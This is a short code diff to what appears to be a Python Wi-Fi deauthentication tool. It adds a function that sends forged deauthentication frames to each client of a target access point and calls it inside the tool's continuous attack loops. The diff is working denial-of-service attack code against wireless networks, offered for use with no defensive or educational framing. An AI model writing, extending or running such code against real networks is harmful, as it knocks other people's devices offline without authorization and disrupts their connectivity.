@@ -13,6 +13,11 @@ def send_AP_deauth(AP):
 	print("Sending deauth packet to %s" % (AP.BSSID))
 	sendp(pkt, iface=network.interface_name, verbose=False)
 
+def send_client_deauth(AP):
+	for client in AP.clients:
+		pkt = AP.build_client_deauth_pkt(client)
+		sendp(pkt, iface=network.interface_name, verbose=False)
+
 
 def deauth_AP(BSSID):
 	interfaces = get_interfaces()
@@ -23,6 +28,7 @@ def deauth_AP(BSSID):
 	prepare_attack()
 	while 1:
 		send_AP_deauth(AP)
+		send_client_deauth(AP)
 
 
 def deauth_all(skip):
@@ -36,6 +42,7 @@ def deauth_all(skip):
 				continue
 			set_channel(AP)
 			send_AP_deauth(AP)
+			send_client_deauth(AP)
 
 def kill_processes():
     try:
